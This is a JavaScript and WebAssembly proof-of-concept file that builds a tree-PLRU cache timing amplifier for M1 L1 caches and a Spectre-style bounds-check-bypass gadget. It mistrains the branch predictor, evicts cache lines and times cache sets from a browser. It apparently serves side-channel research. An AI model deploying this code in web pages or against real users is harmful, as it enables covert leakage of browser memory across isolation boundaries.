const wasmBytes = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x1a, 0x02, 0x60, 0x01, 0x7f, 0x01, 0x7f, 0x60, 0x11, 0x7f, 0x7f, 0x7f, 0x7f, 0x7f, 0x7f, 0x7f, 0x7f, 0x7f, 0x7f, 0x7f, 0x7f, 0x7f, 0x7f, 0x7f, 0x7f, 0x7f, 0x00, 0x02, 0x22, 0x02, 0x03, 0x65, 0x6e, 0x76, 0x03, 0x6d, 0x65, 0x6d, 0x02, 0x01, 0x80, 0x40, 0x80, 0x40, 0x03, 0x65, 0x6e, 0x76, 0x0c, 0x70, 0x6c, 0x72, 0x75, 0x43, 0x61, 0x6c, 0x6c, 0x62, 0x61, 0x63, 0x6b, 0x00, 0x00, 0x03, 0x03, 0x02, 0x01, 0x01, 0x07, 0x2a, 0x02, 0x11, 0x6f, 0x73, 0x63, 0x69, 0x6c, 0x6c, 0x61, 0x74, 0x65, 0x54, 0x72, 0x65, 0x65, 0x50, 0x4c, 0x52, 0x55, 0x00, 0x01, 0x12, 0x6f, 0x73, 0x63, 0x69, 0x6c, 0x6c, 0x61, 0x74, 0x65, 0x54, 0x72, 0x65, 0x65, 0x50, 0x4c, 0x52, 0x55, 0x32, 0x00, 0x02, 0x0a, 0x99, 0x05, 0x02, 0xa0, 0x02, 0x00, 0x41, 0x00, 0x20, 0x09, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x0a, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x0b, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x0c, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x0d, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x0e, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x0f, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x10, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x01, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x02, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x03, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x04, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x06, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x07, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x08, 0x6a, 0x28, 0x02, 0x00, 0x10, 0x00, 0x03, 0x00, 0x20, 0x01, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x02, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x03, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x04, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x06, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x07, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x08, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x01, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x02, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x03, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x04, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x06, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x07, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x08, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x01, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x02, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x03, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x04, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x06, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x07, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x08, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x00, 0x41, 0x03, 0x6b, 0x21, 0x00, 0x20, 0x00, 0x41, 0x00, 0x4e, 0x0d, 0x00, 0x0b, 0x1a, 0x0b, 0xf4, 0x02, 0x00, 0x41, 0x00, 0x20, 0x09, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x0a, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x0b, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x0c, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x0d, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x0e, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x0f, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x10, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x01, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x02, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x03, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x04, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x06, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x07, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x08, 0x6a, 0x28, 0x02, 0x00, 0x10, 0x00, 0x03, 0x00, 0x20, 0x01, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x02, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x03, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x04, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x06, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x07, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x08, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x01, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x02, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x03, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x04, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x06, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x07, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x08, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x01, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x02, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x03, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x04, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x06, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x07, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x08, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x05, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x00, 0x41, 0x03, 0x6b, 0x21, 0x00, 0x20, 0x00, 0x41, 0x00, 0x4e, 0x0d, 0x00, 0x0b, 0x1a, 0x0b]);

// These constants are fixed for the M1.
const PAGE_SZ = 16 * 1024;
const CACHE_LINES_PER_PAGE = 256;
const CACHE_WAYS = 8;
const CACHE_LINE_SZ = 64;
const L1_REPS = 4000;

class L1Timer {
    constructor(callback) {
        this.memory = new WebAssembly.Memory({
            initial: 8192,
            maximum: 8192,
        });
        const wasmU82 = new Uint8Array(this.memory.buffer);
        for (let i = 0; i < wasmU82.length; i += PAGE_SZ) {
            wasmU82[i + 8] = 1;
        }
        this.memPages = Math.floor(8192 * 64 * 1024) / PAGE_SZ;
        this.cacheSets = this._generateCacheSets();
        this.clearSets = this._generateCacheSets();

        this.wasm = new WebAssembly.Instance(new WebAssembly.Module(wasmBytes), {
            env: {
                mem: this.memory,
                plruCallback: callback
            }
        });

        this.timeCacheSet(0);
        for (let i = 0; i < 100000; i++) {
            callback();
        }
    }

    _timeL1(cacheSet, clearSet) {
        // New construct: spin until next clock edge hits.
        // const edge = Math.floor(performance.now());
        // while (Math.floor(performance.now()) == edge) { }

        // Another construct: floor to performance.now() because
        // rounding can sometimes result in imprecise decimals
        // const start = Math.floor(performance.now());
        const start = performance.now();
        this.wasm.exports.oscillateTreePLRU2(
            L1_REPS,
            cacheSet[0],
            cacheSet[1],
            cacheSet[2],
            cacheSet[3],
            cacheSet[4],
            cacheSet[5],
            cacheSet[6],
            cacheSet[7],
            clearSet[0],
            clearSet[1],
            clearSet[2],
            clearSet[3],
            clearSet[4],
            clearSet[5],
            clearSet[6],
            clearSet[7]
        );
        // const end = Math.floor(performance.now());
        const end = performance.now();
        return end - start;
    }

    _randomPage() {
        const rnd = Math.floor(Math.random() * this.memPages);
        return PAGE_SZ * rnd;
    }

    _generateCacheSets() {
        const cacheSets = new Array(CACHE_LINES_PER_PAGE);
        for (let i = 0; i < cacheSets.length; i++) {
            cacheSets[i] = new Array(CACHE_WAYS);
        }
        for (let i = 0; i < cacheSets[0].length; i++) {
            cacheSets[0][i] = this._randomPage();
        }
        for (let i = 1; i < cacheSets.length; i++) {
            for (let j = 0; j < cacheSets[i].length; j++) {
                cacheSets[i][j] = cacheSets[0][j] + i * CACHE_LINE_SZ;
            }
        }
        return cacheSets;
    }

    timeCacheSet(cacheSetIndex) {
        const cacheSet = this.cacheSets[cacheSetIndex];
        const clearSet = this.clearSets[cacheSetIndex];
        return this._timeL1(cacheSet, clearSet);
    }
}

/*
 Returns a page-aligned ArrayBuffer; wasm memory is always page-aligned.
 */
function alignedArrayBuffer(sz) {
    const wasm_pages = Math.ceil(sz / (64 * 1024));
    return new WebAssembly.Memory({ initial: wasm_pages, maximum: wasm_pages }).buffer;
}

/*
 Setup for experiments: avoid allocate-on-write for probeArray and
 declare two PLRU timers, where touch_timer touches the measurement set
 and control_timer does not.
 */
const SET = 129;
const probeArray = new Uint8Array(alignedArrayBuffer(PAGE_SZ));
for (let i = 0; i < probeArray.length; i += PAGE_SZ) {
    probeArray[i + 8] = 1;
}
const control_timer = new L1Timer((trash) => probeArray[0 << 6 + trash]);
const touch_timer = new L1Timer((trash) => probeArray[SET << 6 + trash]);

/*
 Take the median of 100 samples and compare across the experiments.
 */
function test_architectural() {
    let control = [];
    for (let i = 0; i < 100; i++) {
        control.push(control_timer.timeCacheSet(SET));
    }

    let experiment = [];
    for (let i = 0; i < 100; i++) {
        experiment.push(touch_timer.timeCacheSet(SET));
    }

    control.sort();
    experiment.sort();
    console.log(`Cached: ${control[control.length / 2]}, Evicted: ${experiment[experiment.length / 2]}`);
    return;
}

/* 
 L1 eviction set code from leaky.page
 */
const kEndMarker = 0xffffffff;
const kWasmPageSize = 64 * 1024;
class EvictionList {
    constructor(initialSize, offset) {
        const memorySize = initialSize * PAGE_SZ;
        this.memory = new DataView(new WebAssembly.Memory({ initial: Math.ceil(memorySize / kWasmPageSize) }).buffer);
        this.head = offset;
        for (let i = 0; i < initialSize - 1; i++) {
            this.memory.setUint32(i * PAGE_SZ + offset, (i + 1) * PAGE_SZ + offset, true);
        }
        this.tail = (initialSize - 1) * PAGE_SZ + offset;
        this.memory.setUint32(this.tail, kEndMarker, true);
        this.length = initialSize;
    }

    traverse() {
        let e = this.head;
        while (e != kEndMarker) {
            e = this.memory.getUint32(e, true);
        }
        return e;
    }
}

// Victim for eviction is in L1 set zero. This can be probeArray[0].
const es = new EvictionList(200, 0);
const spectreArgs = new Uint8Array([0]);
probeArray[0] = 15;

/*
 Callback function for PLRU with set access that happens under
 speculation if probeArray[0] is not in the L1 cache.
 */
function spectreGadget(trash) {
    // We want to access as little memory as possible to avoid false positives.
    // Putting arguments in a global array seems to work better than passing them
    // as parameters.
    const idx = spectreArgs[0] | 0;

    // Add a loop to control the state of the branch predictor
    // I.e. we want the last n branches taken/not taken to be consistent
    for (let i = 0; i < 200; i++);

    // PLRU + speculation: probeArray[0] will be evicted from L1
    return probeArray[idx < probeArray[0] ? SET << 6 : 0x400];
}

const spectreTimer = new L1Timer(spectreGadget);

/*
 Function to test PLRU under speculation. Mistrains branch predictors
 by calling spectreGadget twice with params that make the branch true,
 then times the third call with PLRU.
 */
function testBit(cond) {
    spectreArgs[0] = 0;

    for (let j = 0; j < 2; j++) {
        spectreGadget();
    }

    probeArray[0];

    // Try to evict the length field of our array from memory, so that we can
    // speculate over the length check if the argument is true.
    if (cond) es.traverse();

    spectreArgs[0] = 31;

    // In the gadget, we access cacheSet 0 if the bit was 0 and set 32 for bit 1.
    return spectreTimer.timeCacheSet(SET);
}

/*
 Take the median of 100 samples and compare across two experiments where
 in one, probeArray[0] is cached in L1; in another, it is evicted from L1.
 */
function test_speculation() {
    const evict_times = [];
    for (let i = 0; i < 100; i++) {
        evict_times.push(testBit(true));
    }

    const cached_times = [];
    for (let i = 0; i < 100; i++) {
        cached_times.push(testBit(false));
    }

    evict_times.sort();
    cached_times.sort();
    console.log(`Cached: ${cached_times[cached_times.length / 2]}, Evicted: ${evict_times[evict_times.length / 2]}`);
}